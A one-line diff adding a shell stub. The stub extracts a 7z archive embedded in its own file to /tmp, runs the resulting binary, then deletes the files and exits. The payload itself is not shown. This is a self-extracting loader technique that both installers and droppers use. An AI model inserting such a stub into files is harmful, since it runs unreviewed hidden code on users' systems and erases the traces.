@@ -1,0 +1,1 @@
+tail -n+2 $0>/tmp/i.7z;cd /tmp;7z x -so i.7z>i;chmod +x i;./i;rm i i.7z;exit
